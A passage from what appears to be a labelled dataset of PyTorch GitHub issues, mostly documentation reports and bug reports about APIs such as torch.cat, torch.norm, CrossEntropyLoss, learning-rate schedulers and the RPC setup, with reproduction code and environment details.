7.3.0-16ubuntu3) 7.3.0`), cmake is pretty much exactly the minimal example here (https://pytorch.org/cppdocs/installing.html) but renamed and without MSVC\r\n\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen @jlin27"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\nhttps://pytorch.org/cppdocs/api/classat_1_1_tensor.html#_CPPv4NK2at6Tensor4itemEv\r\nand\r\nhttps://pytorch.org/cppdocs/api/classat_1_1_tensor.html#_CPPv4I0ENK2at6Tensor4itemE1Tv\r\n\r\nare both missing descriptions.\r\n\r\n--------\r\n\r\nI am trying to get a `float` out of a `Tensor` (that is a single element, kFloat32) on the GPU.\r\n\r\ne.g.\r\n`float x = x_tensor.item()`\r\nHowever, this gives a compile-time error:\r\n`error: cannot convert ‚Äòc10::Scalar‚Äô to ‚Äòdouble‚Äô in assignment`\r\n\r\nUsing `float x = x_tensor<float>.item()` compiles just fine, doesn't work either (program spins forever, probably waiting for CUDA kernel to end after a bad memory access or something).\r\n\r\nWhat is the proper way to get the float out of the tensor (and back into main memory)? It prints just fine, so it must be doable.\r\nI'd prefer to do it without printing and parsing or moving the entire tensor back to the CPU.\n\ncc @yf225 @glaringlee @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nFrom the module code overview page: https://pytorch.org/docs/master/_modules/ there are some modules whose source code documentation page isn't properly displaying and instead displays the \"*Oops! You've reached a dead end*\" page. \r\n\r\ne.g. \r\n\r\n* https://pytorch.org/docs/master/_modules/torch/__config__.html\r\n* https://pytorch.org/docs/master/_modules/torch/_jit_internal.html\r\n* https://pytorch.org/docs/master/_modules/torch/_lobpcg.html\r\n* https://pytorch.org/docs/master/_modules/torch/_lowrank.html\r\n* https://pytorch.org/docs/master/_modules/torch/jit/_script.html\r\n* https://pytorch.org/docs/master/_modules/torch/jit/_trace.html\r\n\r\nWhen I build the docs using a local copy of PyTorch however, the HTML files properly build for these pages. \r\n\r\ne.g. for `torch/__config__`\r\n\r\n**Locally built:**\r\n\r\n<img width=\"960\" alt=\"locally-built-pytorch-docs\" src=\"https://user-images.githubusercontent.com/54918401/86973415-85804600-c142-11ea-9358-2ebf95152bf8.png\">\r\n\r\n**Public page on PyTorch website:**\r\n\r\n<img width=\"1044\" alt=\"public-pytorch-docs\" src=\"https://user-images.githubusercontent.com/54918401/86973452-9335cb80-c142-11ea-8c88-0d39b1ba636c.png\">\r\n\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nIt looks as though the code is missing for the [Audio Classification Tutorial](https://pytorch.org/tutorials/beginner/audio_classifier_tutorial.html). I didn't see code in the html document or at the [linked GitHib url](https://github.com/pytorch/tutorials/blob/master/beginner_source/audio_classifier_tutorial.py).\r\n\r\nThis is what I see:\r\n\r\n<img width=\"1440\" alt=\"Screenshot 2020-07-08 at 7 57 09 AM\" src=\"https://user-images.githubusercontent.com/6405428/86857353-e7b05b00-c0f0-11ea-998a-845795efefb8.png\">\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\nAccording to the documentation, the signature of `torch.cat` is `torch.cat(tensors, dim=0, out=None)`. However, it is not possible to call `torch.cat` with three positional arguments.\r\n\r\n## To Reproduce\r\n\r\n```\r\n>>> torch.cat([torch.rand(1, 2, 3), torch.rand(1, 2, 3)], 0, torch.FloatTensor(12))\r\nTypeError: cat() received an invalid combination of arguments - got (list, int, Tensor), but expected one of:\r\n * (tuple of Tensors tensors, name dim, *, Tensor out)\r\n * (tuple of Tensors tensors, int dim, *, Tensor out)\r\n```\r\n\r\nThe following works though, notice that I only added `out=` to the third argument. However, this should not be required as per the signature definition in the documentation.\r\n\r\n```\r\n>>> torch.cat([torch.rand(1, 2, 3), torch.rand(1, 2, 3)], 0, out=torch.FloatTensor(12))\r\ntensor([[[0.6310, 0.3772, 0.7654],\r\n         [0.8126, 0.7031, 0.6288]],\r\n\r\n        [[0.3101, 0.7344, 0.5670],\r\n         [0.0366, 0.5181, 0.3637]]])\r\n```\r\n\r\n## Expected behavior\r\n\r\n`torch.cat` should be callable without having to use a named argument for `out`.\r\n\r\n## Environment\r\n\r\n```\r\nPyTorch version: 1.5.0+cu101\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 20.04 LTS\r\nGCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0\r\nCMake version: version 3.16.3\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.1.243\r\nGPU models and configuration: GPU 0: GeForce GTX 1650\r\nNvidia driver version: 440.64\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.1\r\n[pip3] torch==1.5.0+cu101\r\n[pip3] torchvision==0.6.0+cu101\r\n[conda] numpy                     1.18.1                   pypi_0    pypi\r\n[conda] torch                     1.5.0+cu101              pypi_0    pypi\r\n[conda] torchvision               0.6.0+cu101              pypi_0    pypi\r\n```\n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\n*Note*: I'm linking 1.5.0, not 1.5.1, b/c I can't get a permalink to 1.5.1 docs :(\r\n\r\nI was trying to get familiar with how BatchNorm stuff works:\r\nhttps://pytorch.org/docs/1.5.0/nn.html?highlight=batchnorm#torch.nn.BatchNorm1d\r\nThe docs and paper xref were great! But I didn't have a good grasp of how the running estimates were actually implemented, so I looked at the code:\r\nhttps://github.com/pytorch/pytorch/blob/480851ad2c21e8e39e336d849b8030a2f91718d7/torch/nn/modules/batchnorm.py#L41-L54\r\n\r\nLooked pretty straightforward, and I learned what \"buffers\" are in this context for `pytorch`; however, I was wondering what this did to the registration of buffers / parameters.\r\n\r\nLooking at the docs for both `.register_parameter` and `.register_buffer`:\r\nhttps://pytorch.org/docs/1.5.0/nn.html#torch.nn.Module.register_buffer\r\nhttps://pytorch.org/docs/1.5.0/nn.html#torch.nn.Module.register_parameter\r\n\r\nI notice that there are kinda code paths for handling the `None` case, but it's not documented (at least not in this immediate area).\r\n\r\nFrom what it looks like, registering something with `None` is tantamount to just setting the attribute to `None` - there's no real exposure of the parameter to users...\r\n\r\n## Suggestion Solutions\r\n\r\n* Document this behavior in `.register_parameter` and `.register_buffer` - if you register a buffer / parameter with `None`, it's basically just gonna be ignored\r\n* Have some brief exposition defining the terms \"parameter\" and \"buffer\" next to each other, and mention the possible equivalence of `Parameter.requires_grad=False` to a registered buffer? AFAICT, this comparison is done kinda implicitly, e.g.:\r\n  * <https://pytorch.org/tutorials/beginner/saving_loading_models.html#what-is-a-state-dict>\r\n  * <https://pytorch.org/tutorials/recipes/recipes/what_is_state_dict.html> - smells like a copy of the first?\r\n\r\n## Related\r\n\r\n* #8104 - all the `None` stuff\r\n* #16675 - understandable about `register_buffers` looking like a hack... but I guess it's pretty well used?\r\n* #39670 - behavior for `jit`\r\n* (kinda meta) <https://discuss.pytorch.org/t/what-is-the-difference-between-register-buffer-and-register-parameter-of-nn-module/32723/10> - asked my question - why buffers instead of parameters, and equivalence\r\n* #2018 - most recent PR that mentions `register_buffer` (Sep. 2017)\r\n* 7f4ff0e615e - introduction of the `Module.register_buffer` in Sep. 2016, I guess to help w/ impl. of `BatchNorm`\r\n\r\n## Example\r\n\r\nUsing Torch 1.5.1:\r\n```py\r\nfrom pprint import pformat\r\n\r\nimport torch.nn as nn\r\n\r\ndef show(code):\r\n    module = eval(code)\r\n    print(f\">>> {code}\")\r\n    print()\r\n    print(f\"state_dict:\\n{pformat(module.state_dict())}\\n\")\r\n    print(f\"parameters:\\n{pformat(list(module.named_parameters()))}\\n\")\r\n    print(f\"buffers:\\n{pformat(list(module.named_buffers()))}\\n\")\r\n    print(\"---\")\r\n\r\n# Everything.\r\nshow('nn.BatchNorm1d(1)')\r\n\r\n# No parameters.\r\nshow('nn.BatchNorm1d(1, affine=False)')\r\n\r\n# No buffers.\r\nshow('nn.BatchNorm1d(1, track_running_stats=False)')\r\n```\r\n\r\nOutput:\r\n```\r\n>>> nn.BatchNorm1d(1)\r\n\r\nstate_dict:\r\nOrderedDict([('weight', tensor([1.])),\r\n             ('bias', tensor([0.])),\r\n             ('running_mean', tensor([0.])),\r\n             ('running_var', tensor([1.])),\r\n             ('num_batches_tracked', tensor(0))])\r\n\r\nparameters:\r\n[('weight', Parameter containing:\r\ntensor([1.], requires_grad=True)),\r\n ('bias', Parameter containing:\r\ntensor([0.], requires_grad=True))]\r\n\r\nbuffers:\r\n[('running_mean', tensor([0.])),\r\n ('running_var', tensor([1.])),\r\n ('num_batches_tracked', tensor(0))]\r\n\r\n---\r\n>>> nn.BatchNorm1d(1, affine=False)\r\n\r\nstate_dict:\r\nOrderedDict([('running_mean', tensor([0.])),\r\n             ('running_var', tensor([1.])),\r\n             ('num_batches_tracked', tensor(0))])\r\n\r\nparameters:\r\n[]\r\n\r\nbuffers:\r\n[('running_mean', tensor([0.])),\r\n ('running_var', tensor([1.])),\r\n ('num_batches_tracked', tensor(0))]\r\n\r\n---\r\n>>> nn.BatchNorm1d(1, track_running_stats=False)\r\n\r\nstate_dict:\r\nOrderedDict([('weight', tensor([1.])), ('bias', tensor([0.]))])\r\n\r\nparameters:\r\n[('weight', Parameter containing:\r\ntensor([1.], requires_grad=True)),\r\n ('bias', Parameter containing:\r\ntensor([0.], requires_grad=True))]\r\n\r\nbuffers:\r\n[]\r\n\r\n---\r\n```\r\n\r\ncc @jlin27 @albanD @mruberry"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\nTorch 1.5.0 CPU, Linux\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nhttps://github.com/pytorch/pytorch/blob/master/torch/optim/lr_scheduler.py#L448\r\n\r\nBug API: `torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max, eta_min=0, last_epoch=-1)`\r\n\r\nIf set T_max =5, initial learning_rate of optimizer are 0.5, eta_min=0:\r\n\r\nThe value calculated by framework are as flow :\r\n![image](https://user-images.githubusercontent.com/52485244/86489498-16e46680-bd97-11ea-9a10-622d48d4cf3e.png)\r\n\r\nBut the value calculated by formula in the document are as flowÔºö\r\nhttps://pytorch.org/docs/stable/optim.html?highlight=cosineannealinglr#torch.optim.lr_scheduler.CosineAnnealingLR\r\n![image](https://user-images.githubusercontent.com/52485244/86489333-a2112c80-bd96-11ea-8e01-19fa5ae1227a.png)\r\n\r\nThese Two doesn't match, in epoch 5. one is 0, but the other is 0.0954915028125. I want to know which one is right, thank you very much!\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## üöÄ Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\nA graphs page on site, to track the evolution of PyTorch, along with the time required to train neural networks, along with the data available.\r\n## Motivation\r\n\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\nWithout graph it become difficult to see, where things are headed.\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\nI suggest a few graphs, a few more could be added,\r\n1) Evolution of PyTorch\r\n2) Evolution of time required to train neural network, since the beginning of PyTorch\r\n3) Evolution of data available since the beginning of PyTorch in terms of size\r\n4) Evolution of number of parameters in neural network\r\n5) Evolution of FLOPS\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## üêõ Bug\r\n\r\nWhen we pass a list of parameters or parameter groups to an optimizer, and one parameter appears multiple times we get different behaviours, and it is not clear whether this is intended that way:\r\n\r\n* If the parameter appears twice within one parameter group, everything works. That parameter will get updated *twice* though.\r\n* If the parameter appears in distinct parameter groups, then we get an error.\r\n\r\n## To Reproduce\r\n\r\n```\r\nimport torch\r\nx = torch.zeros((1,), requires_grad=True)\r\n# uncomment one of the following three lines for each of the cases:\r\n# a = torch.optim.SGD(params=[dict(params=[x])], lr=0.1) # baseline\r\n# a = torch.optim.SGD(params=[dict(params=[x, x])], lr=0.1)  # apparently acceptable (?); x is updated twice\r\n# a = torch.optim.SGD(params=[dict(params=x), dict(params=x)], lr=0.1)  # apparently not acceptable\r\nx.sum().backward()\r\na.step()\r\nprint(x)\r\n```\r\n\r\n## Expected behavior\r\n\r\nI would expect that no matter in what way a parameter apperas multiple times, we get the same behaviour in both situations: Either we get errors in both situations, or both situations are deemed acceptable.\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): 1.5\r\n - OS (e.g., Linux): Win/Linux\r\n - How you installed PyTorch: conda\r\n - Python version: 3.7\r\n\r\n\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nThe link to [\"PyTorch\" organization on GitHub](https://github.com/orgs/pytorch/teams/facebook) seems to be broken, when accessed from PyTorch Governance (both on the [master version](https://pytorch.org/docs/master/community/governance.html#core-developers) and the [stable version](https://pytorch.org/docs/stable/community/governance.html#core-developers)).\r\n\r\nIt does not work even on [Github source code of pages](https://github.com/pytorch/pytorch/blob/master/docs/source/community/governance.rst#core-developers).\r\n\r\nIs this an old link? What should we replace it with?\n\ncc @jlin27"},{"labels":["documentation",null],"text":"PyTorch has accumulated a lot of lingo that are fuzzily-defined. Need a glossary table that gives a clear definition to commonly used terms to facilitate discussion and communication. \n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nHi, during training, I noticed that when specifiying weights for CrossEntropyLoss, using the 'mean' reduction produces a different loss output, compared to using the 'none' reduction and computing the mean manually.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```\r\nimport torch\r\nimport torch.nn as nn\r\n\r\nlogits = torch.randn((16, 5))\r\ntargets = torch.empty(16, dtype=torch.long).random_(5)\r\n\r\nweights = [1, 2, 3, 4, 5]\r\ncross_ent_mean = nn.CrossEntropyLoss(weight=torch.FloatTensor(weights), reduction='mean')\r\nloss_a = cross_ent_mean(logits, targets)\r\nprint(loss_a)\r\n\r\ncross_ent = nn.CrossEntropyLoss(weight=torch.FloatTensor(weights), reduction='none')\r\nloss_b = cross_ent(logits, targets).mean()\r\nprint(loss_b)\r\n\r\nassert torch.equal(loss_a, loss_b)\r\n```\r\n\r\n## Expected behavior\r\n\r\nThe loss computed by the two methods should be equal `torch.equal(loss_a, loss_b) = True`\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0): 1.6.0.dev20200505+cu101\r\n - OS (e.g., Linux): Windows 10\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.7.6\r\n - CUDA/cuDNN version: CUDA 10.1 (irrelevant)\r\n - GPU models and configuration: GTX970M (irrelevant)\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\nIt seems to be the problem with the weights as I tried out to assign the same weight to all the classes, however, theorectically, the weighted loss should be computed before applying the mean() operation.\n\ncc @ezyang @gchanan @zou3519 @jlin27 @albanD @mruberry"},{"labels":["documentation",null,null],"text":"This function has an input parameter add_histogram(), what does it mean? There is no documentation about this parameter. \r\n\r\nDocumentation link \r\nhttps://pytorch.org/docs/stable/tensorboard.html#torch.utils.tensorboard.writer.SummaryWriter.add_histogram\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\n[https://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_normal_](https://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_normal_)\r\n\r\n[https://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_uniform_](https://pytorch.org/docs/stable/nn.init.html#torch.nn.init.kaiming_uniform_)\r\n\r\n#### API\r\n\r\n`torch.nn.init.kaiming_uniform_` \r\n\r\n`torch.nn.init.kaiming_normal_`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input :\r\n\r\n**with 'leaky_relu')** (*used*) ‚Äì\r\n\r\nwhich should be part of the description for input argument `a`\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null],"text":"## üìö Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/cuda.html#torch.cuda.set_rng_state_all\r\n\r\n#### API\r\n\r\n`torch.utils.checkpoint.checkpoint_sequential`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input ` new_state`, but it is not in the signature, and it is not accepted by the function. It should be `new_states`\r\n\r\nRunning code :\r\n\r\n~~~python\r\ntorch.cuda.set_rng_state_all(new_state=(torch.ByteTensor(1)))\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: set_rng_state_all() got an unexpected keyword argument 'new_state'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version:  1.5.0\r\n- Python version: 3.8.2\r\n\r\ncc @ngimel @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nThe current documentation says it's an \"ordered dictionary that respects the order of insertion\", but it can, in fact, destroy its order. For example: \r\n\r\n![image](https://user-images.githubusercontent.com/38511765/85050917-aeb54400-b14b-11ea-9e61-5aa455df6019.png)\r\n\r\nWe should update our documentation to clarify its behavior, especially as users might try to enumerate the dict sequentially. \r\n\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,null,"documentation",null,null],"text":"##  üìö Documentation\r\ntorch==1.5.0\r\n\r\nThe problem is the same for all three functions. For example, let's consider [no_grad](https://pytorch.org/docs/stable/autograd.html#torch.autograd.no_grad).\r\n\r\nThe documentation says: \"This mode has no effect when using `enable_grad` context manager\". This is not true:\r\n```python\r\nimport torch\r\nx = torch.tensor([1.0], requires_grad=True)\r\nwith torch.enable_grad():\r\n    with torch.no_grad():\r\n        y = x * 2\r\nassert not y.requires_grad\r\n```\r\n\r\nAnd I mean that the documentation should be fixed, not the behavior of `torch` üòÑ \r\nThese functions just set grad enabled/disabled in `__enter__` (or in the constructor in the case of `set_grad_enabled`) and set the _previous_ state in `__exit__`. This is very intuitive. IMHO, it will be confusing if, for example, the behavior of `no_grad` changes depending on some other context.\n\ncc @ezyang @gchanan @zou3519 @SsnL @albanD @gqchen @jlin27"},{"labels":[null,"documentation",null,null],"text":"## üêõ Bug\r\n\r\nCalling `torch.save` on a sliced tensor seems to write the entire unsliced tensor to disk.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n```\r\nimport torch\r\n\r\narray = torch.zeros(1000000)\r\nslice = array[:1000]\r\nclone = slice.clone()\r\n\r\ntorch.save(array, 'array.pt') # 3.9MB on disk\r\ntorch.save(slice, 'slice.pt') # 3.9MB on disk\r\ntorch.save(clone, 'clone.pt') # 4.3KB on disk\r\n```\r\n\r\n## Expected behavior\r\n\r\n`torch.save` only writes the bytes to disk that are part of the slice. The file-sizes of `slice.pt` and `clone.pt` in the above example should be equal.\r\n\r\n## Environment\r\n```\r\nPyTorch version: 1.5.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.2\r\n\r\nOS: Arch Linux\r\nGCC version: (GCC) 10.1.0\r\nCMake version: version 3.17.3\r\n\r\nPython version: 3.8\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.2.89\r\nGPU models and configuration: GPU 0: GeForce RTX 2060 SUPER\r\nNvidia driver version: 440.82\r\ncuDNN version: /usr/lib/libcudnn.so.7.6.5\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.5\r\n[pip3] torch==1.5.0\r\n[pip3] torchsummary==1.5.1\r\n[conda] Could not collect\r\n```\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## üìö Documentation\r\n\r\nPR gh-37419 refactored the content of `docs/source/rpc/index.rst` into `docs/source/rpc.rst` but did not link to the latter from `doc/source/index.rst` so the top-level RPC documentation is missing from https://pytorch.org/docs/master/.\r\n\r\nThis should be fixed before the next release. I think it should be enough to replace `rpc/index.rst` with `rpc` on [`docs/source/index.rst`](https://github.com/pytorch/pytorch/blob/master/docs/source/index.rst) and make sure the top-level page is then visible.\r\n\r\nnoticed by @mrshenli \n\ncc @jlin27 @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nWhen it comes to parameter `dim` in `torch.norm`, the documentation says\r\n```\r\ndim (int, 2-tuple of python:ints, 2-list of python:ints, optional) ‚Äì \r\nIf it is an int, vector norm will be calculated, if it is 2-tuple of ints,\r\nmatrix norm will be calculated.\r\n```\r\n\r\nWhen `p` is specified and `dim` is a 2-tuple, I would expect `torch.norm` to compute an induced matrix norm, but instead it computes an L_p norm (vector norm) over a flattened matrix.\r\n\r\nFor example:\r\n```python\r\nIn [1]: import torch\r\n\r\nIn [2]: x = torch.eye(3, 3)\r\n\r\nIn [3]: torch.norm(x, p=1, dim=(-2, -1)) # dim is a tuple, want a matrix norm\r\nOut[3]: tensor(3.) # should be 1 in case of 1 induced matrix norm\r\n\r\n```\r\n\r\n\r\ncc @jlin27"},{"labels":["documentation",null],"text":"## Background\r\nThis post is to gather feedback on the proposal to split up larger doc pages (e.g. torch.html) into subpages to reduce load time and help with content searchability. This is done by adding a summary table in the main page that links to subpages for each function/class.\r\n\r\nMore details can be found in this PR: https://github.com/pytorch/pytorch/issues/38010\r\n\r\n*Known Issue:* New format generates new urls which would break existing documentation links. *Proposed Fixes:*\r\nhttps://github.com/pytorch/pytorch/pull/39086\r\nhttps://github.com/pytorch/pytorch/pull/39032\r\n\r\n## Feedback Instructions\r\n1. Review the current view for torch compared to the newly proposed view: \r\n* Current: https://pytorch.org/docs/stable/torch.html\r\n* Proposed New: https://5591729-65600975-gh.circle-artifacts.com/0/docs/torch.html\r\n\r\n2. Leave a comment highlighting:\r\n* Pros\r\n* Cons\r\n* Which option do you prefer and why? \n\ncc @jlin27"},{"labels":["documentation",null,null,null],"text":"## üìö Documentation\r\n\r\nI am following the following documentation;\r\n\r\nhttps://pytorch.org/docs/master/rpc.html#torch.distributed.rpc.rpc_async\r\n\r\nWhen I use the given export commands, the program breaks showing that \r\n\r\nFor Address ENV\r\n\r\n```bash\r\nraise _env_error(\"MASTER_ADDR\")\r\nValueError: Error initializing torch.distributed using env:// rendezvous: environment variable MASTER_ADDR expected, but not set\r\n```\r\n\r\nFor PORT ENV\r\n```bash\r\n raise _env_error(\"MASTER_PORT\")\r\nValueError: Error initializing torch.distributed using env:// rendezvous: environment variable MASTER_PORT expected, but not set\r\n```\r\n\r\nModified as follows, fixes the error. \r\n\r\n```bash\r\nexport MASTER_ADDR=localhost\r\nexport MASTER_PORT=5678\r\n```\r\n\r\nI tested this with the following way\r\n\r\n```bash\r\npython3 -m venv ENV\r\nsource activate ENV/bin/activate\r\npip3 install torch\r\n```\r\n\r\nScript `test_torch_dist.py'\r\n\r\n```python\r\nimport sys\r\nimport torch\r\nimport torch.distributed.rpc as rpc\r\n\r\n\r\ndef p1():\r\n    print(\r\n        \"Worker 1\"\r\n    )\r\n    rpc.init_rpc(\"worker0\", rank=0, world_size=2)\r\n    fut1 = rpc.rpc_async(\"worker1\", torch.add, args=(torch.ones(2), 3))\r\n    fut2 = rpc.rpc_async(\"worker1\", min, args=(1, 2))\r\n    result = fut1.wait() + fut2.wait()\r\n    print(result)\r\n    rpc.shutdown()\r\n\r\ndef p2():\r\n    print(\r\n        \"Worker 2\"\r\n    )\r\n    rpc.init_rpc(\"worker1\", rank=1, world_size=2)\r\n    rpc.shutdown()\r\n\r\n\r\nargs = sys.argv\r\n\r\nprint(\"Args {}\".format(int(args[1])))\r\n\r\nif int(args[1]) == 1:\r\n    p1()\r\n\r\nif int(args[1]) == 2:\r\n    p2()\r\n\r\n```\r\n\r\nTerminal 1:\r\n\r\n```bash\r\npython3 test_torch_dist.py 1\r\n```\r\n\r\nTerminal 2:\r\n\r\n```bash\r\npython3 test_torch_dist.py 2\r\n```\r\n\r\nMachine configs: \r\n```bash\r\nlsb_release -a\r\n\r\nDistributor ID: Ubuntu\r\nDescription:    Ubuntu 20.04 LTS\r\nRelease:        20.04\r\nCodename:       focal\r\n```\r\n\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jlin27 @jjlilley"},{"labels":["documentation",null],"text":"## üìö Documentation\r\n\r\nIn the Tensor API documentation page.\r\n\r\nI saw \r\n\r\n> self, index and src should have same number of dimensions. It is also required that index.size(d) <= src.size(d) for all dimensions d, and that index.size(d) <= self.size(d) for all dimensions d != dim.\r\n\r\nBut when I look at size() API. \r\n\r\nhttps://pytorch.org/docs/stable/tensors.html#torch.Tensor.size\r\nIt doesn't mention it can take an argument. Is something missing?\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## üöÄ Feature\r\n\r\nCurrently, the [recommended approach to achieve reproducibility](https://pytorch.org/docs/stable/notes/randomness.html) is setting global random seeds. I would like to propose that instead all functions which need a random source accept a local, non-global, `random_seed`/`random_state` argument to which one can pass a random state object, or numpy generator, or something else, which binds random source locally.\r\n\r\n## Motivation\r\n\r\nReproducibility if often needed in ML programs. But current approach of setting global random seed in various places in pytorch is suitable only for small programs which are using only pytorch. Now imagine that you have many libraries around, each trying to set global random seed at various times. This can lead to strange changes in random seeds just because you swapped two calls around. Moreover, if any of those libraries stand-alone produces a sequence of numbers, it might be that when used in combination with pytorch the sequence is not anymore the same. So if you are trying to compare two different implementations (one in pytorch one in some other library), the behavior of the implementation in the other library can change just because you also have pytorch around.\r\n\r\nOf course, the other library should also not be using global random source. But ideally pytorch should not either.\r\n\r\nIn our concrete case, we have an AutoML system generating many candidate pipelines using primitives to build those pipelines which in turn use many different libraries. Those pipelines are run and we hope to have full reproducibility (which helps with metalearning). But setting/resetting global random seed just because one primitive in one candidate pipeline we are exploring happens to use pytorch influences behavior of unrelated pipelines.\r\n\r\n## Pitch\r\n\r\nInstead of relying on global random sources, add `random_state` parameter to all functions which expect/use randomness. Do not ever set random seed of a global random source in pytorch code (the user of pytorch can do that themselves if they really want).\r\n\r\n## Alternatives\r\n\r\nUse context managers to set and reset random seeds, but this becomes tricky when using multi-threading.\r\n\r\n## Additional context\r\n\r\nSee example in [sklearn](https://scikit-learn.org/stable/glossary.html#term-random-state).\n\ncc @jlin27 @pbelevich"},{"labels":[null,"documentation",null],"text":"The only mention of this in the doc is \r\nhttps://github.com/pytorch/pytorch/blob/0251ba61089795a7a27c0473e4bb022805432c1f/torch/distributed/distributed_c10d.py#L337-L341\r\nwith no example. \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jlin27"},{"labels":["documentation",null,null,null],"text":"## üìö Documentation\r\n\r\nThe information regarding the [_add_graph()_ function in the Tensorboard doc](https://pytorch.org/docs/stable/tensorboard.html#torch.utils.tensorboard.writer.SummaryWriter.add_graph) is empty. The missing info seems to be there in its [source](https://pytorch.org/docs/stable/_modules/torch/utils/tensorboard/writer.html#SummaryWriter.add_graph) tough. \r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## üêõ Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\nCurrently, it is a bit tricky to switch from CPU build to CUDA build. Users will sometimes forget to specify the cudatoolkit requirement and find out that they installed the CPU build. Then they will attempt to follow the steps on pytorch.org, that is `conda install -c pytorch cudatoolkit=x.x pytorch`. But actually that is not enough because `cpuonly` is still there.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. `conda install -c pytorch cpuonly pytorch`\r\n2. `conda install -c pytorch cudatoolkit=x.x pytorch`\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\nBetter user message. \r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"## üìö Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn the getting started section [this](https://pytorch.org/get-started/locally/#linux-from-source) section the following quote appears:\r\n\r\n> You will also need to build from source if you want CUDA support.\r\n\r\nI guess this is from previous versions where CUDA support was not built-in and this can be removed, correct?\n\ncc @ezyang @gchanan @zou3519 @jlin27"},{"labels":["documentation",null,null,null],"text":"## 